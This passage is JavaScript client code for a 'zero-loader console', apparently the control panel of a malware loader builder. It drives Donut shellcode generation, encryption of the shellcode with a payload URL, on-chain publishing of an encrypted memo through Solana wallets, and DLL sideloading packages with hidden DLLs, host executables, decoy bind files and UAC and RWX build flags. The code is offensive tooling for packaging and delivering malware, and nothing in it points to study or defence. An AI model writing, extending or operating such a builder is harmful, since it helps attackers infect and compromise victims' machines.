/* zero-loader console — client logic */

const $  = (sel, root = document) => root.querySelector(sel);
const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));

// ─── utilities ────────────────────────────────────────────────────────────

function fmtSize(n) {
  if (!n) return "0 B";
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / 1024 / 1024).toFixed(2)} MB`;
}
function fmtTime(sec) {
  return new Date(sec * 1000).toLocaleString();
}
function fmtTimeShort(sec) {
  const d = new Date(sec * 1000);
  return d.toLocaleDateString([], {month:"short", day:"numeric"}) + " " +
         d.toLocaleTimeString([], {hour:"2-digit", minute:"2-digit"});
}
function trunc(s, n = 20) {
  return s && s.length > n ? s.slice(0, n) + "…" : (s || "");
}
function writeConsole(el, line, { ok = null, reset = false } = {}) {
  if (reset) el.textContent = "";
  el.textContent += line;
  el.scrollTop = el.scrollHeight;
  el.classList.remove("ok", "bad");
  if (ok === true)  el.classList.add("ok");
  if (ok === false) el.classList.add("bad");
}

// ─── page switching ────────────────────────────────────────────────────────

$$(".page-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    $$(".page-btn").forEach(b => b.classList.toggle("active", b === btn));
    const target = btn.dataset.page;
    $$(".page").forEach(p => p.classList.toggle("active", p.id === `page-${target}`));
    if (target === "donut")    refreshDonutJobs();
    if (target === "solana")   refreshWallets();
    if (target === "sideload") refreshSideloadAssets();
    if (target === "build")  { refreshStatus(); refreshEncryptDropdowns(); refreshSideloadSelectors(); refreshEncryptHistory(); refreshBuildHistory(); }
  });
});

// ─── inner tab switching (Build page) ─────────────────────────────────────

$$(".tab").forEach(btn => {
  btn.addEventListener("click", () => {
    $$(".tab").forEach(t => t.classList.toggle("active", t === btn));
    const target = btn.dataset.tab;
    $$(".panel").forEach(p => p.classList.toggle("active", p.id === `panel-${target}`));
    if (target === "encrypt") refreshEncryptHistory();
    if (target === "build")   refreshBuildHistory();
  });
});

// ─── status pills ─────────────────────────────────────────────────────────

async function refreshStatus() {
  try {
    const j = await fetch("/api/status").then(r => r.json());
    const pp = $("#pill-payload");
    pp.textContent = j.payload_h ? "Payload.h ✓" : "Payload.h —";
    pp.classList.toggle("ok",  !!j.payload_h);
    pp.classList.toggle("bad", !j.payload_h);
    const ps = $("#pill-sideload");
    ps.textContent = j.sideload_h ? "Sideload.h ✓" : "Sideload.h —";
    ps.classList.toggle("ok",  !!j.sideload_h);
    ps.classList.toggle("bad", !j.sideload_h);
  } catch (_) {}
}

// ─── artifacts ────────────────────────────────────────────────────────────

function refreshArtifacts() {
  const list = $("#artifact-list");
  list.innerHTML = "";
  if (!_buildHistory.length) {
    list.innerHTML = "<p class='empty-note'>No builds yet.</p>";
    return;
  }
  for (const j of _buildHistory.slice(0, 10)) {
    const li = document.createElement("li");
    li.className = "artifact";
    const dot    = j.ok ? "●" : "○";
    const dotCls = j.ok ? "dot-ok" : "dot-bad";
    const sz     = j.zip_size > 0 ? j.zip_size : (j.binary_size || 0);
    let dlLink = "";
    if (j.zip_size > 0)
      dlLink = `<a class="dl" href="/api/build/history/${j.id}/download/zip">↓ zip</a>`;
    else if (j.binary_size > 0)
      dlLink = `<a class="dl" href="/api/build/history/${j.id}/download/binary">↓ bin</a>`;
    li.innerHTML = `
      <div class="name">
        <span class="ji-dot ${dotCls}">${dot}</span>
        <span>${j.zip_name || j.binary_name || "—"}</span>
        ${dlLink}
      </div>
      <div class="meta">${j.mode} · ${fmtSize(sz)} · ${fmtTimeShort(j.created_at)}</div>`;
    list.appendChild(li);
  }
}
$("#btn-refresh-arts").addEventListener("click", () => { refreshBuildHistory(); });

// ─── memo copy / download ──────────────────────────────────────────────────

$("#btn-copy-memo").addEventListener("click", async () => {
  const text = $("#memo-box").textContent.trim();
  if (!text) return;
  try {
    await navigator.clipboard.writeText(text);
    const btn = $("#btn-copy-memo");
    btn.textContent = "Copied!";
    setTimeout(() => { btn.textContent = "Copy"; }, 1800);
  } catch {
    const sel = window.getSelection(), range = document.createRange();
    range.selectNodeContents($("#memo-box"));
    sel.removeAllRanges(); sel.addRange(range);
  }
});

$("#btn-dl-memo").addEventListener("click", () => {
  const text = $("#memo-box").textContent.trim();
  if (!text) return;
  const blob = new Blob([text + "\n"], { type: "text/plain" });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement("a");
  a.href     = url; a.download = "memo.txt";
  document.body.appendChild(a); a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
});

// ─── encrypt dropdowns ────────────────────────────────────────────────────
// Populates:  #enc-sc-job  (shellcode from donut workspace)
//             #enc-wallet-sel + #pep-wallet-sel (wallets from solana workspace)

async function refreshEncryptDropdowns() {
  // Donut jobs → shellcode selector
  try {
    const jobs = await fetch("/api/donut/jobs").then(r => r.json());
    const sel  = $("#enc-sc-job");
    const prev = sel.value;
    sel.innerHTML = "";
    const ok = jobs.filter(j => j.ok);
    if (!ok.length) {
      sel.innerHTML = `<option value="">— no successful Donut jobs yet —</option>`;
    } else {
      sel.innerHTML = `<option value="">— select a Donut job —</option>`;
      for (const j of ok) {
        const opt = document.createElement("option");
        opt.value = j.id;
        opt.textContent = `#${j.id}  ${j.original_name}  (${fmtSize(j.size_out)})  ${j.arch_label}`;
        if (j.id === prev) opt.selected = true;
        sel.appendChild(opt);
      }
    }
  } catch (_) {}

  // Wallets → encrypt wallet selector
  try {
    const wallets  = await fetch("/api/wallets").then(r => r.json());
    const encSel   = $("#enc-wallet-sel");
    const prevEnc  = encSel.value;

    let html = `<option value="">— select from Solana workspace —</option>`;
    for (const w of wallets)
      html += `<option value="${w.id}" data-addr="${w.address}">${w.name} — ${trunc(w.address, 20)}</option>`;
    encSel.innerHTML = html;
    if (prevEnc && [...encSel.options].some(o => o.value === prevEnc))
      encSel.value = prevEnc;
  } catch (_) {}
}

// Wallet selector → auto-fill address text field
$("#enc-wallet-sel").addEventListener("change", () => {
  const opt  = $("#enc-wallet-sel").selectedOptions[0];
  const addr = opt?.dataset.addr || "";
  $("#enc-wallet").value = addr;
});

// Shellcode source toggle
$$("input[name=sc_src]").forEach(r => r.addEventListener("change", syncScSource));
function syncScSource() {
  const mode = $("input[name=sc_src]:checked")?.value;
  $("#enc-sc-job").style.display  = mode === "workspace" ? "" : "none";
  $("#enc-sc-file").style.display = mode === "upload"    ? "" : "none";
}
syncScSource();

// ─── encrypt ──────────────────────────────────────────────────────────────

$("#form-encrypt").addEventListener("submit", async (e) => {
  e.preventDefault();
  const out     = $("#out-encrypt");
  const memoWrap = $("#memo-wrap");
  const memoBox  = $("#memo-box");
  writeConsole(out, "> running Encrypt.py …\n", { reset: true });
  memoWrap.classList.add("hidden");
  memoBox.textContent = "";

  const form = e.target;
  const fd   = new FormData();

  // URL
  const url = form.url?.value?.trim();
  if (url) fd.append("url", url);

  // Wallet: prefer wallet_id from select, fall back to text
  const walletSelOpt = $("#enc-wallet-sel").selectedOptions[0];
  const walletId     = walletSelOpt?.value || "";
  if (walletId) {
    fd.append("wallet_id", walletId);
  } else {
    const addr = form.sol_wallet?.value?.trim() || "";
    if (addr) fd.append("sol_wallet", addr);
  }

  // RPC
  const rpc = form.rpc_url?.value?.trim();
  if (rpc) fd.append("rpc_url", rpc);

  // Shellcode source
  const scMode = $("input[name=sc_src]:checked")?.value;
  if (scMode === "workspace") {
    const jobId = $("#enc-sc-job").value;
    if (jobId) fd.append("shellcode_job_id", jobId);
  } else {
    const file = $("#enc-sc-file").files[0];
    if (file) fd.append("shellcode", file);
  }

  try {
    const r = await fetch("/api/encrypt", { method: "POST", body: fd });
    const j = await r.json();
    if (j.stdout) writeConsole(out, j.stdout);
    if (j.stderr) writeConsole(out, j.stderr);
    writeConsole(out, `\n[exit ${j.code ?? (j.ok ? 0 : -1)}]\n`, { ok: j.ok });
    if (j.payload_preview) $("#preview-payload").textContent = j.payload_preview;
    if (j.memo) {
      memoBox.textContent = j.memo;
      memoWrap.classList.remove("hidden");
      memoWrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
    }
  } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
  refreshStatus();
  refreshEncryptHistory();
});


// ─── sideload workspace (DLL + EXE management) ────────────────────────────

let _dlls  = [];
let _exes  = [];
let _binds = [];

async function refreshSideloadAssets() {
  await Promise.all([refreshDlls(), refreshExes(), refreshBinds()]);
}

// ── DLLs ──────────────────────────────────────────────────────────────────

async function refreshDlls() {
  try { _dlls = await fetch("/api/dlls").then(r => r.json()); }
  catch (_) { _dlls = []; }
  renderDlls();
  refreshSideloadSelectors();
}

function renderDlls() {
  const list  = $("#dll-list");
  const empty = $("#dll-empty");
  list.querySelectorAll(".sl-asset-item").forEach(el => el.remove());
  if (!_dlls.length) { empty.style.display = ""; return; }
  empty.style.display = "none";
  for (const d of _dlls) {
    const el = document.createElement("div");
    el.className = "sl-asset-item";
    const selDllId = $("#sl-dll-sel")?.value;
    const active = selDllId === d.id ? " selected" : "";
    el.innerHTML = `
      <div class="sai-info${active}">
        <span class="sai-name">${d.name}</span>
        <span class="sai-meta">#${d.id} · ${fmtSize(d.size)} · ${fmtTimeShort(d.created_at)}</span>
      </div>
      <div class="sai-btns">
        <button class="btn-xs primary" data-select-dll="${d.id}" title="Select for build">Use</button>
        <button class="btn-xs btn-danger" data-del-dll="${d.id}" title="Delete">✕</button>
      </div>`;
    list.appendChild(el);
    el.querySelector(`[data-select-dll]`).addEventListener("click", () => selectDll(d.id));
    el.querySelector(`[data-del-dll]`).addEventListener("click", () => deleteDll(d.id));
  }
}

function selectDll(id) {
  const sel = $("#sl-dll-sel");
  if (sel) sel.value = id;
  updateSideloadSummary();
  renderDlls(); // refresh "active" highlight
}

async function deleteDll(id) {
  if (!confirm("Delete this DLL from workspace?")) return;
  await fetch(`/api/dlls/${id}`, { method: "DELETE" });
  refreshDlls();
}

$("#sl-dll-upload").addEventListener("change", async (e) => {
  const file = e.target.files[0];
  if (!file) return;
  const fd = new FormData();
  fd.append("dll", file);
  const btn = $("label[for=sl-dll-upload]");
  const orig = btn.textContent;
  btn.textContent = "Uploading…";
  try {
    const r = await fetch("/api/dlls", { method: "POST", body: fd });
    const j = await r.json();
    if (j.ok) { await refreshDlls(); selectDll(j.dll.id); }
    else alert("Upload failed: " + (j.stderr || "unknown error"));
  } catch (err) { alert("Upload error: " + err); }
  finally { btn.textContent = orig; e.target.value = ""; }
});

// ── EXEs ──────────────────────────────────────────────────────────────────

async function refreshExes() {
  try { _exes = await fetch("/api/exes").then(r => r.json()); }
  catch (_) { _exes = []; }
  renderExes();
  refreshSideloadSelectors();
}

function renderExes() {
  const list  = $("#exe-list");
  const empty = $("#exe-empty");
  list.querySelectorAll(".sl-asset-item").forEach(el => el.remove());
  if (!_exes.length) { empty.style.display = ""; return; }
  empty.style.display = "none";
  for (const x of _exes) {
    const el = document.createElement("div");
    el.className = "sl-asset-item";
    const selExeId = $("#sl-exe-sel")?.value;
    const active = selExeId === x.id ? " selected" : "";
    el.innerHTML = `
      <div class="sai-info${active}">
        <span class="sai-name">${x.name}</span>
        <span class="sai-meta">#${x.id} · ${fmtSize(x.size)} · ${fmtTimeShort(x.created_at)}</span>
      </div>
      <div class="sai-btns">
        <button class="btn-xs primary" data-select-exe="${x.id}" title="Select for build">Use</button>
        <button class="btn-xs btn-danger" data-del-exe="${x.id}" title="Delete">✕</button>
      </div>`;
    list.appendChild(el);
    el.querySelector(`[data-select-exe]`).addEventListener("click", () => selectExe(x.id));
    el.querySelector(`[data-del-exe]`).addEventListener("click", () => deleteExe(x.id));
  }
}

function selectExe(id) {
  const sel = $("#sl-exe-sel");
  if (sel) sel.value = id;
  updateSideloadSummary();
  renderExes();
}

async function deleteExe(id) {
  if (!confirm("Delete this EXE from workspace?")) return;
  await fetch(`/api/exes/${id}`, { method: "DELETE" });
  refreshExes();
}

$("#sl-exe-upload").addEventListener("change", async (e) => {
  const file = e.target.files[0];
  if (!file) return;
  const fd = new FormData();
  fd.append("exe", file);
  const btn = $("label[for=sl-exe-upload]");
  const orig = btn.textContent;
  btn.textContent = "Uploading…";
  try {
    const r = await fetch("/api/exes", { method: "POST", body: fd });
    const j = await r.json();
    if (j.ok) { await refreshExes(); selectExe(j.exe.id); }
    else alert("Upload failed: " + (j.stderr || "unknown error"));
  } catch (err) { alert("Upload error: " + err); }
  finally { btn.textContent = orig; e.target.value = ""; }
});

// ── Bind files ────────────────────────────────────────────────────────────

async function refreshBinds() {
  try { _binds = await fetch("/api/binds").then(r => r.json()); }
  catch (_) { _binds = []; }
  renderBinds();
  refreshSideloadSelectors();
}

function renderBinds() {
  const list  = $("#bind-list");
  const empty = $("#bind-empty");
  list.querySelectorAll(".sl-asset-item").forEach(el => el.remove());
  if (!_binds.length) { empty.style.display = ""; return; }
  empty.style.display = "none";
  for (const b of _binds) {
    const el = document.createElement("div");
    el.className = "sl-asset-item";
    const selBindId = $("#sl-bind-sel")?.value;
    const active = selBindId === b.id ? " selected" : "";
    el.innerHTML = `
      <div class="sai-info${active}">
        <span class="sai-name">${b.name}</span>
        <span class="sai-meta">#${b.id} · ${fmtSize(b.size)} · ${fmtTimeShort(b.created_at)}</span>
      </div>
      <div class="sai-btns">
        <a class="btn-xs" href="/api/binds/${b.id}/download" title="Download">↓</a>
        <button class="btn-xs primary" data-select-bind="${b.id}" title="Select for build">Use</button>
        <button class="btn-xs btn-danger" data-del-bind="${b.id}" title="Delete">✕</button>
      </div>`;
    list.appendChild(el);
    el.querySelector(`[data-select-bind]`).addEventListener("click", () => selectBind(b.id));
    el.querySelector(`[data-del-bind]`).addEventListener("click", () => deleteBind(b.id));
  }
}

function selectBind(id) {
  const sel = $("#sl-bind-sel");
  if (sel) sel.value = id;
  updateSideloadSummary();
  renderBinds();
}

async function deleteBind(id) {
  if (!confirm("Delete this bind file from workspace?")) return;
  await fetch(`/api/binds/${id}`, { method: "DELETE" });
  refreshBinds();
}

$("#sl-bind-upload").addEventListener("change", async (e) => {
  const file = e.target.files[0];
  if (!file) return;
  const fd = new FormData();
  fd.append("bind", file);
  const btn = $("label[for=sl-bind-upload]");
  const orig = btn.textContent;
  btn.textContent = "Uploading…";
  try {
    const r = await fetch("/api/binds", { method: "POST", body: fd });
    const j = await r.json();
    if (j.ok) { await refreshBinds(); selectBind(j.bind.id); }
    else alert("Upload failed: " + (j.stderr || "unknown error"));
  } catch (err) { alert("Upload error: " + err); }
  finally { btn.textContent = orig; e.target.value = ""; }
});

// ── sideload dropdowns (in Build tab) ────────────────────────────────────

function refreshSideloadSelectors() {
  const dllSel  = $("#sl-dll-sel");
  const exeSel  = $("#sl-exe-sel");
  const bindSel = $("#sl-bind-sel");
  if (!dllSel || !exeSel) return;

  const prevDll  = dllSel.value;
  const prevExe  = exeSel.value;
  const prevBind = bindSel ? bindSel.value : "";

  dllSel.innerHTML = _dlls.length
    ? `<option value="">— select DLL —</option>` + _dlls.map(d =>
        `<option value="${d.id}">${d.name}  (#${d.id} · ${fmtSize(d.size)})</option>`).join("")
    : `<option value="">— no DLLs in workspace yet —</option>`;
  if (prevDll && [...dllSel.options].some(o => o.value === prevDll)) dllSel.value = prevDll;

  exeSel.innerHTML = _exes.length
    ? `<option value="">— select EXE —</option>` + _exes.map(x =>
        `<option value="${x.id}">${x.name}  (#${x.id} · ${fmtSize(x.size)})</option>`).join("")
    : `<option value="">— no EXEs in workspace yet —</option>`;
  if (prevExe && [...exeSel.options].some(o => o.value === prevExe)) exeSel.value = prevExe;

  if (bindSel) {
    bindSel.innerHTML = `<option value="">— none —</option>` + _binds.map(b =>
      `<option value="${b.id}">${b.name}  (#${b.id} · ${fmtSize(b.size)})</option>`).join("");
    if (prevBind && [...bindSel.options].some(o => o.value === prevBind)) bindSel.value = prevBind;
  }

  updateSideloadSummary();
}

["sl-dll-sel", "sl-exe-sel", "sl-dll-rename", "sl-host-rename", "sl-zip-name",
 "sl-bind-sel", "sl-bind-rename"].forEach(id => {
  document.getElementById(id)?.addEventListener("change", updateSideloadSummary);
  document.getElementById(id)?.addEventListener("input",  updateSideloadSummary);
});

function updateSideloadSummary() {
  const box      = $("#bld-sl-summary");
  if (!box) return;
  const dllSel   = $("#sl-dll-sel");
  const exeSel   = $("#sl-exe-sel");
  const bindSel  = $("#sl-bind-sel");
  const dllOpt   = dllSel?.selectedOptions[0];
  const exeOpt   = exeSel?.selectedOptions[0];
  const bindOpt  = bindSel?.selectedOptions[0];
  const dllName  = dllOpt?.value  ? dllOpt.text.split("  ")[0]  : null;
  const exeName  = exeOpt?.value  ? exeOpt.text.split("  ")[0]  : null;
  const bindName = bindOpt?.value ? bindOpt.text.split("  ")[0] : null;
  const rename   = $("#sl-dll-rename")?.value.trim();
  const hRename  = $("#sl-host-rename")?.value.trim();
  const bRename  = $("#sl-bind-rename")?.value.trim();
  const zip      = $("#sl-zip-name")?.value.trim();

  if (!dllName && !exeName) {
    box.textContent = "No DLL / EXE selected — configure in the Sideload tab.";
    return;
  }
  const origName  = rename  || (dllName  ? dllName.replace(/\.dll$/i, "_orig.dll") : "—");
  const hostOut   = hRename || exeName   || "—";
  const bindOut   = bRename || bindName  || null;
  const zipOut    = zip || "(zip name required)";
  let bindLine = "";
  if (bindOut) bindLine = `<br>Bind → <strong>_\\${bindOut}</strong>`;
  box.innerHTML =
    `DLL: <strong>${dllName || "—"}</strong> (hidden)  ` +
    `EXE: <strong>${exeName || "—"}</strong><br>` +
    `ZIP → <strong>${zipOut}</strong>  ` +
    `[${dllName || "—"} (hidden) · ${origName} (hidden) · ${hostOut}]` +
    bindLine;
}

// ─── build ────────────────────────────────────────────────────────────────

function syncBuildMode() {
  const mode = $("input[name=mode]:checked", $("#form-build"))?.value;
  const summary = $("#field-sideload-summary");
  if (summary) summary.classList.toggle("hidden", mode !== "sideload");
}
$$("input[name=mode]").forEach(r => r.addEventListener("change", () => {
  syncBuildMode();
  updateSideloadSummary();
  // Persist the chosen mode so it survives page reloads
  try { localStorage.setItem("zeroBuildMode", r.value); } catch (_) {}
}));
// Restore last-used mode on boot (before first syncBuildMode call)
try {
  const _savedMode = localStorage.getItem("zeroBuildMode");
  if (_savedMode) {
    const _modeEl = $(`input[name=mode][value="${_savedMode}"]`, $("#form-build"));
    if (_modeEl) _modeEl.checked = true;
  }
} catch (_) {}
syncBuildMode();

$("#form-build").addEventListener("submit", async (e) => {
  e.preventDefault();
  const out = $("#out-build"), form = e.target;
  out.textContent = ""; out.classList.remove("ok", "bad");

  const mode = $("input[name=mode]:checked", form)?.value;
  const body = {
    mode,
    uac:       form.uac.checked,
    rwx:       form.rwx.checked,
    debug:     form.debug.checked,
    synthetic: form.synthetic.checked,
    // sideload-specific (always included; server ignores for EXE mode)
    dll_id:          $("#sl-dll-sel")?.value           || "",
    exe_id:          $("#sl-exe-sel")?.value           || "",
    sideload_rename: $("#sl-dll-rename")?.value.trim() || "",
    host_rename:     $("#sl-host-rename")?.value.trim() || "",
    zip_name:        $("#sl-zip-name")?.value.trim()    || "",
    bind_id:         $("#sl-bind-sel")?.value           || "",
    bind_rename:     $("#sl-bind-rename")?.value.trim() || "",
  };

  const btn = $("button.primary", form);
  btn.disabled = true; btn.textContent = "Building…";
  try {
    const r = await fetch("/api/build", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    const reader = r.body.getReader(), decoder = new TextDecoder();
    let buf = "";
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      buf = decoder.decode(value, { stream: true });
      writeConsole(out, buf);
    }
    const last = out.textContent.trim().split("\n").at(-1);
    const m = last?.match(/\[exit (-?\d+)\]/);
    if (m) { out.classList.toggle("ok", m[1] === "0"); out.classList.toggle("bad", m[1] !== "0"); }
  } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
  finally { btn.disabled = false; btn.textContent = "Build"; refreshStatus(); refreshBuildHistory(); }
});

// ─── profiles ─────────────────────────────────────────────────────────────

let _profiles = [];
// Tracks the profile that was last loaded so "Save current" updates it in-place.
let _currentProfileId   = null;
let _currentProfileName = "";

async function refreshProfiles() {
  try { _profiles = await fetch("/api/profiles").then(r => r.json()); }
  catch (_) { _profiles = []; }
  renderProfiles();
}

function renderProfiles() {
  const list  = $("#profile-list");
  const empty = $("#profile-empty");
  list.innerHTML = "";
  if (!_profiles.length) { empty.classList.remove("hidden"); return; }
  empty.classList.add("hidden");
  for (const p of _profiles) {
    const li = document.createElement("li");
    li.className = "mgmt-item";
    // Build a compact summary of what's in the profile
    const parts = [p.mode || "exe"];
    if (p.shellcode_job_id) parts.push(`sc:#${p.shellcode_job_id}`);
    if (p.sideload_rename)  parts.push(`→${p.sideload_rename}`);
    if (p.bind_id)          parts.push("bind");
    if (p.output)           parts.push(p.output);
    const flags = [p.uac?"uac":"", p.rwx?"rwx":"", p.debug?"dbg":"", p.synthetic?"syn":""].filter(Boolean).join(" ");
    if (flags) parts.push(flags);
    li.innerHTML = `
      <div class="mi-info">
        <div class="mi-name">${p.name}</div>
        <div class="mi-meta">${parts.join(" · ")}</div>
        <div class="mi-meta" style="color:var(--text-mute);font-size:10px">${p.url ? trunc(p.url, 28) : "—"}</div>
      </div>
      <div class="mi-btns">
        <button class="btn-sm primary" data-load="${p.id}">Load</button>
        <button class="btn-sm btn-danger" data-del-profile="${p.id}">✕</button>
      </div>`;
    list.appendChild(li);
  }
  list.querySelectorAll("[data-load]").forEach(btn =>
    btn.addEventListener("click", () => loadProfile(btn.dataset.load)));
  list.querySelectorAll("[data-del-profile]").forEach(btn =>
    btn.addEventListener("click", () => deleteProfile(btn.dataset.delProfile)));
}

function loadProfile(id) {
  const p = _profiles.find(x => x.id === id);
  if (!p) return;
  _currentProfileId   = id;
  _currentProfileName = p.name;
  // Update button label to signal which profile is active
  $("#btn-show-save-profile").textContent = `↺ ${p.name}`;

  // ── Encrypt tab ──────────────────────────────────────────────────────
  $("#enc-url").value    = p.url        || "";
  $("#enc-wallet").value = p.sol_wallet || "";
  $("#enc-rpc").value    = p.rpc_url    || "";

  // Shellcode: restore donut job selection if saved
  if (p.shellcode_job_id) {
    const sel = $("#enc-sc-job");
    sel.value = p.shellcode_job_id;
    // only switch radio if the option actually exists in the list
    if (sel.value === p.shellcode_job_id) {
      const wsRadio = $("input[name=sc_src][value=workspace]");
      if (wsRadio) { wsRadio.checked = true; syncScSource(); }
    }
  }

  // ── Sideload tab ─────────────────────────────────────────────────────
  // DLL selector: restore selection if still in workspace
  const dllSel = $("#sl-dll-sel");
  if (dllSel && p.dll_id) {
    dllSel.value = p.dll_id;
    if (dllSel.value !== p.dll_id) dllSel.value = ""; // option no longer exists
  }
  const exeSel = $("#sl-exe-sel");
  if (exeSel && p.exe_id) {
    exeSel.value = p.exe_id;
    if (exeSel.value !== p.exe_id) exeSel.value = "";
  }
  const dllRenameEl = $("#sl-dll-rename");
  if (dllRenameEl) dllRenameEl.value = p.sideload_rename || "";
  const hostRenameEl = $("#sl-host-rename");
  if (hostRenameEl) hostRenameEl.value = p.host_rename || "";
  const zipNameEl = $("#sl-zip-name");
  if (zipNameEl) zipNameEl.value = p.zip_name || "";

  // Bind file selector + rename
  const bindSel = $("#sl-bind-sel");
  if (bindSel && p.bind_id) {
    bindSel.value = p.bind_id;
    if (bindSel.value !== p.bind_id) bindSel.value = "";
  }
  const bindRenameEl = $("#sl-bind-rename");
  if (bindRenameEl) bindRenameEl.value = p.bind_rename || "";

  // ── Build tab ────────────────────────────────────────────────────────
  const modeEl = $(`#form-build input[name=mode][value="${p.mode || "exe"}"]`);
  if (modeEl) { modeEl.checked = true; try { localStorage.setItem("zeroBuildMode", p.mode || "exe"); } catch (_) {} }
  $("#bld-uac").checked   = !!p.uac;
  $("#bld-rwx").checked   = !!p.rwx;
  $("#bld-debug").checked = !!p.debug;
  $("#bld-syn").checked   = !!p.synthetic;
  syncBuildMode();
  updateSideloadSummary();

  // Switch to Encrypt tab so user sees the restored values
  $$(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === "encrypt"));
  $$(".panel").forEach(pp => pp.classList.toggle("active", pp.id === "panel-encrypt"));

  // Auto-open the save row in "Update" mode so the user can immediately
  // see the profile name and update it without hunting for the button.
  _openSaveRow();
}

async function deleteProfile(id) {
  if (!confirm("Delete this profile?")) return;
  await fetch(`/api/profiles/${id}`, { method: "DELETE" });
  refreshProfiles();
}

function collectFormData() {
  return {
    // Encrypt tab
    url:              $("#enc-url")?.value              || "",
    sol_wallet:       $("#enc-wallet")?.value           || "",
    rpc_url:          $("#enc-rpc")?.value              || "",
    shellcode_job_id: $("#enc-sc-job")?.value           || "",
    // Sideload tab
    dll_id:           $("#sl-dll-sel")?.value               || "",
    exe_id:           $("#sl-exe-sel")?.value               || "",
    sideload_rename:  $("#sl-dll-rename")?.value.trim()     || "",
    host_rename:      $("#sl-host-rename")?.value.trim()    || "",
    zip_name:         $("#sl-zip-name")?.value.trim()       || "",
    bind_id:          $("#sl-bind-sel")?.value              || "",
    bind_rename:      $("#sl-bind-rename")?.value.trim()    || "",
    // Build tab
    mode:             $("input[name=mode]:checked")?.value || "exe",
    uac:              $("#bld-uac")?.checked            || false,
    rwx:              $("#bld-rwx")?.checked            || false,
    debug:            $("#bld-debug")?.checked          || false,
    synthetic:        $("#bld-syn")?.checked            || false,
  };
}

// ── save profile UI ────────────────────────────────────────────────────────

function _closeSaveRow() {
  $("#profile-save-row").classList.add("hidden");
  $("#profile-name-input").value = "";
}

function _openSaveRow(forceNew = false) {
  const nameInput  = $("#profile-name-input");
  const confirmBtn = $("#btn-confirm-save-profile");
  const saveAsLink = $("#btn-saveas-new");

  if (!forceNew && _currentProfileId) {
    // Updating an existing profile: pre-fill name, show "save as new" escape
    nameInput.value      = _currentProfileName;
    confirmBtn.textContent = "Update";
    saveAsLink.classList.remove("hidden");
  } else {
    // Creating a new profile
    nameInput.value        = "";
    confirmBtn.textContent = "Save";
    saveAsLink.classList.add("hidden");
  }

  $("#profile-save-row").classList.remove("hidden");
  nameInput.focus();
  nameInput.select();
}

$("#btn-show-save-profile").addEventListener("click", () => _openSaveRow());

$("#btn-cancel-save-profile").addEventListener("click", _closeSaveRow);

// "save as new" link: drop the current-profile context and re-open for new
$("#btn-saveas-new").addEventListener("click", e => {
  e.preventDefault();
  _currentProfileId   = null;
  _currentProfileName = "";
  _openSaveRow(true);
});

$("#btn-confirm-save-profile").addEventListener("click", async () => {
  const name = $("#profile-name-input").value.trim();
  if (!name) { $("#profile-name-input").focus(); return; }
  const body = { name, ...collectFormData() };

  if (_currentProfileId) {
    // Update in place
    await fetch(`/api/profiles/${_currentProfileId}`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    _currentProfileName = name;  // reflect any rename
    $("#btn-show-save-profile").textContent = `↺ ${name}`;
  } else {
    // Create new
    const res  = await fetch("/api/profiles", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    const json = await res.json().catch(() => ({}));
    if (json.profile) {
      _currentProfileId   = json.profile.id;
      _currentProfileName = json.profile.name;
      $("#btn-show-save-profile").textContent = `↺ ${json.profile.name}`;
    }
  }

  _closeSaveRow();
  refreshProfiles();
});

// ─── encrypt history ─────────────────────────────────────────────────────

let _encryptHistory = [];

async function refreshEncryptHistory() {
  try { _encryptHistory = await fetch("/api/encrypt/history").then(r => r.json()); }
  catch (_) { _encryptHistory = []; }
  renderEncryptHistory();
}

function renderEncryptHistory() {
  const list  = $("#encrypt-history-list");
  const empty = $("#encrypt-hist-empty");
  list.querySelectorAll(".hist-item").forEach(el => el.remove());

  if (!_encryptHistory.length) { empty.style.display = ""; return; }
  empty.style.display = "none";

  for (const j of _encryptHistory) {
    const el = document.createElement("div");
    el.className = "hist-item";
    // store memo safely on the element — avoids quote-escaping issues
    el.dataset.memo = j.memo || "";

    const dot      = j.ok ? `<span class="ji-dot dot-ok">●</span>` : `<span class="ji-dot dot-bad">○</span>`;
    const urlShort = j.url    ? trunc(j.url, 42)    : "—";
    const wallet   = j.wallet ? trunc(j.wallet, 22) : "—";
    const dateStr  = fmtTimeShort(j.created_at);

    // download links
    let dls = `<a class="btn-xs" href="/api/encrypt/history/${j.id}/download/memo">↓ memo</a>`;
    dls    += ` <a class="btn-xs" href="/api/encrypt/history/${j.id}/download/payload_h">↓ Payload.h</a>`;
    if (j.dat_name && j.dat_size > 0)
      dls  += ` <a class="btn-xs primary" href="/api/encrypt/history/${j.id}/download/dat">↓ ${j.dat_name}</a>`;

    // action buttons
    const copyBtnHtml    = j.memo ? `<button class="btn-xs btn-hist-copy">Copy memo</button>` : "";
    // Publish button: only if we have a memo AND a wallet_id in workspace
    const canPublish     = j.memo && j.wallet_id;
    const publishBtnHtml = canPublish ? `<button class="btn-xs btn-hist-pub">⚡ Publish</button>` : "";

    el.innerHTML = `
      <div class="hist-head">
        ${dot}
        <span class="hist-name">${urlShort}</span>
        <button class="btn-xs btn-danger hist-del" title="Delete run + files">✕</button>
      </div>
      <div class="hist-meta">
        <span class="ji-id">#${j.id}</span>
        <span>${wallet}</span>
        <span>${j.dat_size ? fmtSize(j.dat_size) + " dat" : ""}</span>
        <span>${dateStr}</span>
      </div>
      <div class="hist-dls">${dls} ${copyBtnHtml} ${publishBtnHtml}</div>

      <!-- compact re-publish panel (hidden until ⚡ Publish clicked) -->
      <div class="hist-pub-panel hidden">
        <div class="hist-pub-row">
          <input class="hist-pub-rpc" type="url" placeholder="RPC endpoint (optional)">
          <button class="btn-xs primary hist-pub-btn">Publish on-chain</button>
        </div>
        <pre class="hist-pub-out"></pre>
      </div>`;

    list.appendChild(el);

    // ── wire delete ──
    el.querySelector(".hist-del").addEventListener("click", (ev) => {
      ev.stopPropagation();
